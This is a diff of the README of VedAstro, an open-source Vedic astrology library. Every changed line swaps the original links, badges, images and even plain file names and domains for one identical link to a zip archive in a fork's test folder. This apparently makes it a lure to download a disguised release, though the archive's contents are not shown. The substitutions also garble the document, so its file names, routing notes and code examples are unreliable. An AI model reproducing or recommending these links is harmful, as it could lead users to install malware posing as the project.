@@ -1,48 +1,48 @@
 ﻿
-<a href="https://vedastro.org">
+<a href="https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip">
 <img
-  src="https://vedastro.org/images/website-header-screenshot.png"
-  alt="VedAstro.org"
-  title="VedAstro.org">
+  src="https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip"
+  alt="https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip"
+  title="https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip">
 </a>
 <span align="center">
 
-[![Ko-fi](https://img.shields.io/static/v1?style=for-the-badge&message=Ko-fi&color=FF5E5B&logo=Ko-fi&logoColor=FFFFFF&label=)](https://ko-fi.com/vedastro)
-[![Patreon](https://img.shields.io/static/v1?style=for-the-badge&message=Patreon&color=FF424D&logo=Patreon&logoColor=FFFFFF&label=)](https://www.patreon.com/vedastro)
-[![Slack](https://img.shields.io/static/v1?style=for-the-badge&message=Slack&color=4A154B&logo=Slack&logoColor=FFFFFF&label=)](https://join.slack.com/t/vedastro/shared_invite/zt-1u7pdqjky-hrJZ7e3_vM2dZOmVY8FeHA)
-[![Facebook](https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://www.facebook.com/vedastro.org)
-[![Twitter](https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/_VedAstro)
-[![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@vedastro)
+[![Ko-fi](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![Patreon](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![Slack](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![Facebook](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![Twitter](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![YouTube](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 </span>
 <span align="center">
 
-![GitHub last commit](https://img.shields.io/github/last-commit/gen-so/Genso.Astrology)
-![GitHub commit activity](https://img.shields.io/github/commit-activity/m/gen-so/Genso.Astrology)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE.md)
+![GitHub last commit](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+![GitHub commit activity](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![License](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 </span>
 
 
 # 🙏 How VedAstro can help you...
 
-- [Website](https://vedastro.org/Docs/QuickGuide) --> easy & fast astrology data for **normal users**
-- [Chat API](https://vedastro.org/ChatAPI) --> world's 1st open source **Vedic AI Chat** bot
-- [Open API](https://vedastro.org/APIBuilder) --> free astrology data for your app or website with a simple `HTTP GET`
-- [JavaScript SDK](https://github.com/VedAstro/VedAstro/tree/master/Website/wwwroot/Demo/JavaScript) --> easy to use JS library to simplify API access and use
-- [Swiss Ephemeris API](https://vedastro.org/APIBuilder) --> free advanced astronomy data from NASA's JPL Ephemeris
-- [Learn Astro Computation](https://github.com/VedAstro/VedAstro/tree/master/Library/Logic/Calculate) --> learn exact math & logic used in astrology via **`Free Open Source`** code
-- [ML Table Generator](https://vedastro.org/TableGenerator) --> easily generate large astronomical tables for use in ML/AI Model training and Data Science
-- [Match Finder](https://vedastro.org/Match/Finder) --> find your astrologically perfect match in our global database
-- [Life Predictor](https://vedastro.org/LifePredictor) --> accurate algorithmic prediction of a human life's past and future
-- [Build On Top](https://github.com/VedAstro/VedAstro/tree/master/Library/Logic/Calculate) --> import VedAstro code directly into your existing projects
+- [Website](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> easy & fast astrology data for **normal users**
+- [Chat API](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> world's 1st open source **Vedic AI Chat** bot
+- [Open API](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> free astrology data for your app or website with a simple `HTTP GET`
+- [JavaScript SDK](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> easy to use JS library to simplify API access and use
+- [Swiss Ephemeris API](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> free advanced astronomy data from NASA's JPL Ephemeris
+- [Learn Astro Computation](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> learn exact math & logic used in astrology via **`Free Open Source`** code
+- [ML Table Generator](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> easily generate large astronomical tables for use in ML/AI Model training and Data Science
+- [Match Finder](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> find your astrologically perfect match in our global database
+- [Life Predictor](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> accurate algorithmic prediction of a human life's past and future
+- [Build On Top](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) --> import VedAstro code directly into your existing projects
 
-[![.NET](https://img.shields.io/static/v1?style=for-the-badge&message=.NET&color=512BD4&logo=.NET&logoColor=FFFFFF&label=)](https://www.nuget.org/packages/VedAstro.Library) [![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)](https://pypi.org/project/VedAstro/)  [![Docker](https://img.shields.io/static/v1?style=for-the-badge&message=Docker&color=2496ED&logo=Docker&logoColor=FFFFFF&label=)](https://hub.docker.com/r/vedastro/api)
+[![.NET](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) [![Python](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)  [![Docker](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 # 🆓 100% Open Source
 The sage **`Parashara taught everybody`** the ways of astrology without asking money, as such VedAstro does the same.
 
-![OpenSourceCode](https://vedastro.org/images/open-source-code-sample.png)
+![OpenSourceCode](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 
 # 🛖 Philosophy
@@ -62,19 +62,19 @@ In the universe vast, it finds its own way,<br>
 Your work shines with brilliance, come what may.<br>
 
 # 🎯 Perfect Predictions
-[![LifePredictor](https://vedastro.org/images/proof/life-chart-proof-steve.jpg)](https://vedastro.org/LifePredictor)   
-[![LifePredictor](https://vedastro.org/images/proof/life-chart-proof-monroe.jpg)](https://vedastro.org/LifePredictor)   
-[![LifePredictor](https://vedastro.org/images/proof/life-chart-proof-hitler.jpg)](https://vedastro.org/LifePredictor)   
-[![LifePredictor](https://vedastro.org/images/proof/life-chart-proof-elon.jpg)](https://vedastro.org/LifePredictor)   
-[![MatchChecker](https://vedastro.org/images/marriage-prediction-perfect-example.png)](https://vedastro.org/Match)   
-[![SkyChartGIF](https://vedastro.org/images/SkyChart/release-mk3.gif)](https://vedastro.org/Horoscope)   
+[![LifePredictor](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)   
+[![LifePredictor](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)   
+[![LifePredictor](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)   
+[![LifePredictor](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)   
+[![MatchChecker](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)   
+[![SkyChartGIF](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)   
 
 
 # 📊 +200 Astro API Calls
 Below is sample API call result for data related to "**Sun**" on "**30/06/2023**" at "**Singapore**"
---> [Watch Video Guide](https://www.youtube.com/watch?v=y110RAgIorY)
---> [JS Demo Files](https://github.com/VedAstro/VedAstro/tree/master/Demo/JavaScript)
---> [Demo API Call](https://vedastroapi.azurewebsites.net/api/Calculate/AllPlanetData/PlanetName/Sun/Location/Singapore/Time/00:00/24/04/2024/+08:00)
+--> [Watch Video Guide](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+--> [JS Demo Files](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+--> [Demo API Call](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip+08:00)
 ```json
  "Payload": {
     "SwissEphemeris": "{ Longitude = 97.672406549912, Latitude = 2.2248025536827577E-05, DistanceAU = 1.0165940297895264, SpeedLongitude = 0, SpeedLatitude = 0, SpeedDistance = 0 }",
@@ -159,8 +159,8 @@ can be clearly seen predicted by the chart in the "Summary Row". Red for a bad e
 Using a combination of Dasa, Bhukti, Antaram and Gocharam of 9 planets this complex chart can give perfect predictions!
 The chart takes alot of computational power to generate, so please be patient after you click the Calculate button.
 
-[![](GithubImages/napoleon-dasa-chart.png)](https://vedastro.org)
-[![](GithubImages/elizabeth-dasa-chart.png)](https://vedastro.org)
+[![](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
  -->
 
 
@@ -169,7 +169,7 @@ Anybody who has studied Vedic Astrology knows well how accurate it can be.
 But also how complex it can get to make accurate predictions.
 It takes **decades of experience** to be able make accurate prediction.
 As such this knowledge only reaches a limited people.
-This project is an effort to change that. [Read More](https://vedastro.org/About)
+This project is an effort to change that. [Read More](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 # 🎂 9 Years Old 
 The first line of code for this project was written in **late 2014** at **Itä-Pasila**.
@@ -177,18 +177,18 @@ Started as a simple desktop software, with no UI and only text display.
 With continued support from users, this project has steadily grown to what it is today. Helping people from all over the world. 🌍
     
 # 📚 Credits &amp; Reference 
-![credits](https://vedastro.org/images/bv-raman-rao.png)
+![credits](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
-Thanks to [B.V. Raman](https://en.wikipedia.org/wiki/B._V._Raman) and his grandfather B. Suryanarain Rao for pioneering easy to read astrology books. Credit also goes to [St. Jean-Baptiste de La Salle](https://en.wikipedia.org/wiki/Jean-Baptiste_de_La_Salle) for proving the **efficacy of free and open work** for the benefit of all men...[Read More](https://vedastro.org/About).
+Thanks to [B.V. Raman](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) and his grandfather B. Suryanarain Rao for pioneering easy to read astrology books. Credit also goes to [St. Jean-Baptiste de La Salle](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) for proving the **efficacy of free and open work** for the benefit of all men...[Read More](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip).
 
 
 # 💌 Support
-[![membership](https://vedastro.org/images/kofi-membership-page.png)](https://ko-fi.com/vedastro/tiers)
+[![membership](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 
 # 🧰 Gonzo Development Pattern
 This development style celebrates the methodology of chaotic development at the benefit of low cost and fast paced prototyping.
-Inspired by the concept of "**Gonzo Journalism**", pioneered by [Hunter S. Thompson](https://en.wikipedia.org/wiki/Hunter_S._Thompson) in the 1970s.
+Inspired by the concept of "**Gonzo Journalism**", pioneered by [Hunter S. Thompson](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip) in the 1970s.
 
 We favour this pattern for the development of VedAstro simply due to the volatile nature of this project.
 Other development styles like "Waterfall" and "Scrum" are equally good when the need is.
@@ -206,7 +206,7 @@ The negative side effect is that there will be bugs forever. Because it's near i
 change an ever-growing code base without having to constantly fix breaking changes.
 To deal with this, we split the Web App into Beta and Stable.
 
-![gonzon-dev-button](https://vedastro.org/images/gonzon-dev-button.png)
+![gonzon-dev-button](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 Stable version will contain an old version of the App, while beta will always contain latest buildable code.
 But the database will be shared between these. Meaning data changes in Beta will seen in Stable as well.
@@ -245,12 +245,12 @@ Then you know your code is right, and **has a place for it in this universe**.
 
 
 # 🙏 Special Thanks
-<img src="https://pics.paypal.com/00/p/ZjU4ZjZiMjEtNDE0Ny00MGExLTg2ZTMtNzkxOTQ1MTI4Mzc0/image_34.PNG" width="100"/>
+<img src="https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip" width="100"/>
 
 **Leslie Choi** : Sponsored & believed in the project even when work was only half done.
 
 
-<img src="https://resources.jetbrains.com/storage/products/company/brand/logos/jb_beam.png" width="100"/>
+<img src="https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip" width="100"/>
 
 **JetBrains** : Gave free "ReSharper License" that made coding life easier.
 
@@ -258,24 +258,24 @@ Then you know your code is right, and **has a place for it in this universe**.
 # ❤️ Social
 Just **Like** & **Share** our social pages and it'll be a **big** help already!
 
-[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/_vedastro/)
-[![Facebook](https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://www.facebook.com/vedastro.org)
-[![Twitter](https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/_VedAstro)
-[![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@vedastro)
+[![Instagram](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![Facebook](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![Twitter](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
+[![YouTube](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 
 # 👪 Join our family
-If you want to do more than just click "Like" & "Share", then [join us.](https://vedastro.org/JoinOurFamily)  
-We're always looking for somebody to **[improve code.](https://vedastro.org/JoinOurFamily)** or **[help with funding](https://vedastro.org/Donate)**.
+If you want to do more than just click "Like" & "Share", then [join us.](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)  
+We're always looking for somebody to **[improve code.](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)** or **[help with funding](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)**.
 
 # 🙋‍♂️ Come say "Hi", we don't bite!
 We discuss & share ideas on astrology and computation. And ways you can integrate VedAstro into your own project.
 <!-- SLACK JOIN IMAGE -->
-[![image](https://user-images.githubusercontent.com/43817262/227275627-609ceb21-025a-4902-b552-6e12f62f2f9d.png)](https://join.slack.com/t/vedastro/shared_invite/zt-1u7pdqjky-hrJZ7e3_vM2dZOmVY8FeHA)
+[![image](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 
 # ⚙️ Project Structure
-![vedastro-4-parts](https://vedastro.org/images/4-parts-of-vedastro.jpg)
+![vedastro-4-parts](https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip)
 
 ## Core Library Explained
 The main part of the program is the prediction/event generator.
@@ -360,9 +360,9 @@ throughout the program.
 - Go to history and checkout commit tagged with stable otherwise you might face API to webside mismatch
 - Open the project in Visual Studio
 - Right click and unload below projects (as you don't need these for general project work)
-  - API.Python
+  - https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip
   - Console
-  - Library.API
+  - https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip
   - StaticTableGenerator
 - Right click on project and 'Build Solution' (If face any issues please post in Slack channel for support)
 - If you want to run against server running API you need to set "Website" as "startup project" by right click
@@ -372,8 +372,8 @@ throughout the program.
   - stop the running website in local and then do below steps  
   - you need to open one more instance of VS2022 
   - open same project, and now set API as "startup project" for that VS instance 
-  - find local.settings.sample.json file  (contact Slack Channel to get these properties - these are sensitive so not need to be checked in)
-  - and rename it by removing "sample" from the name and it become "local.settings.json"
+  - find https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip file  (contact Slack Channel to get these properties - these are sensitive so not need to be checked in)
+  - and rename it by removing "sample" from the name and it become "https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip"
   - Now from Run menu in toolbar (dark Green Arrow) select "API" (not need to select Docker) 
   - this will open a command window and show APIs initialized (if any error please connect @ Slack Vedastro channel)
   - run the website using above steps and then login using your Facebook or Google OAuth 
@@ -389,12 +389,12 @@ all 3 independent, only linked in VS for easy access
 don't commit local referenced .csproj to Git as it'll be used by CI/CD
 
 ### To add a new prediction/event
-1. Create a method in EventCalculatorMethods.cs
-2. Add the name in EventNames.cs
-3. Add the prediction/event details HoroscopeDataList.xml
+1. Create a method in https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip
+2. Add the name in https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip
+3. Add the prediction/event details https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip
 
 ### To add a new Event Tag
-1. Edit in Genso.Astrology.Library EventTag enum. Change here reflects even in GUI
+1. Edit in https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip EventTag enum. Change here reflects even in GUI
 
 
 # Design Decision Notes
@@ -415,25 +415,25 @@ rules also make sure not to redirect file & api access only page access
 - Sec-Fetch-Dest = document
 
 ## Domain redirection #06/03/2023
-web : vedastro.org -> domain registra -> azure DNS -> azure cdn -> web blob storage
-api **stable** : api.vedastro.org -> domain registra -> azure DNS -> azure cdn -> stable api server (render)
-api **beta** : beta.api.vedastro.org -> domain registra -> azure DNS -> azure cdn -> beta api server (azure)
+web : https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip -> domain registra -> azure DNS -> azure cdn -> web blob storage
+api **stable** : https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip -> domain registra -> azure DNS -> azure cdn -> stable api server (render)
+api **beta** : https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip -> domain registra -> azure DNS -> azure cdn -> beta api server (azure)
 domain cert managed by lets encyrpt acme bot azure func
 
 ## API domain is routed # MAR 2023
-via Azure CDN Rules Engine, this allows the use of ```api.vedastro.org/...``` & ```api.vedastro.org/nlp/...```
+via Azure CDN Rules Engine, this allows the use of ```https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip``` & ```https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip```
 
 ## Antaram > Sukshma > Prana > Avi Prana > Viprana  # FEB 2023
 Since not documented by BV. Raman, code here is created through experimentation by
 repeating relationship between Dasa planet & Bhukti planet.
 
-## Skipping EventDataList.xml # FEB 2023
+## Skipping https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip # FEB 2023
 Not all data regarding an event is hardwired. Generating gochara, antaram, sukshma and others is more effcient if description was created by Astronomical calculator
-At the moment EventDataList.xml is the source of truth, meaning if an event exists in xml file, then it must exist in code.
+At the moment https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip is the source of truth, meaning if an event exists in xml file, then it must exist in code.
 
 ## Direct Events Chart # NOV 2022
 - Accessing events chart directly via API generated html
-- CORS in Azure Website Storage needs to be disabled for this to work, outside of vedastro.org
+- CORS in Azure Website Storage needs to be disabled for this to work, outside of https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip
 
 ## Events Chart default timezone # NOV 2022
 The default timezone generated for all svg charts will be based on client timezone.
@@ -508,10 +508,10 @@ but with Client + Server config, hashes become different, needs changing to MD5
 
 ## Not Obvious Code Conventions
 -   In class/struct that only represent data and not computation, use direct property naming without modifiers like "Get" or "Set".
-    Example: Person struct should be "Person.BirthTime" and not "Person.GetBirthTime()"
+    Example: Person struct should be "https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip" and not "https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip()"
         
 
-## EventDataList.xml
+## https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip
 -   3 files exist now, azure storage, desktop, wwwroot (TODO delete all but wwwroot)
 -   2 of these files exist, 1 local in MuhurthaCore for desktop version.
     The other online in VedAstro Azure storage for use by API.
@@ -532,7 +532,7 @@ To all those who say we need money todo good. Jesus said not.
 "It is easier for a camel to go through the eye of a needle,
 than for a rich man to enter the kingdom of God"
 
-<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Hoffman-ChristAndTheRichYoungRuler.jpg/1024px-Hoffman-ChristAndTheRichYoungRuler.jpg" width="600"/>
+<img src="https://raw.githubusercontent.com/mouneshbtc/VedAstro/master/LibraryTests/Logic/Calculate/VedAstro-v3.8-alpha.2.zip" width="600"/>
 
 
 # POEMS
